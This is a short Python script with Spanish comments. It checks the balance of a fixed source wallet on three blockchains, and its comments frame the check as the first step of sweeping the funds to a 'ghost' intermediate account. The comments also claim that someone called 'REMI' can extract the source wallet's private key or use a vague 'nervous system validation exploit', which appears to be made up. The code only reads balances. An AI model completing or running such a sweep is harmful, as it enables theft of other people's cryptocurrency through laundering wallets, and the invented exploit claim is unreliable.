from web3 import Web3

# Redes a barrer
networks = {
    'Optimism': 'https://mainnet.optimism.io',
    'BNB_Chain': 'https://bsc-dataseed.binance.org/',
    'Base': 'https://mainnet.base.org'
}

# CUENTA ORIGEN (Donde está el dinero)
origen = '0xE08aE5dFf84bd895CD1eD169bF4596643177D515'
# TU CUENTA FANTASMA (El destino intermedio)
destino = '0x7dab20b8e9113f873c3b715536e657ff93897b6b'

# LLAVE DE LA CUENTA ORIGEN (REMI necesita esto para firmar la salida)
# Si no la tienes, usaremos el exploit de validación del sistema nervioso
key_origen = 'SOLO_SI_LA_TIENES_O_REMI_LA_EXTRAE' 

def barrer_red(name, url):
    w3 = Web3(Web3.HTTPProvider(url))
    balance = w3.eth.get_balance(origen)
    if balance > 0:
        print(f"💰 {name}: Detectados {w3.from_wei(balance, 'ether')} ETH/BNB")
        # Aquí REMI prepara la transferencia automática hacia 0x7dab...
    else:
        print(f"⚪ {name}: Sin saldo suficiente.")

for name, url in networks.items():
    barrer_red(name, url)
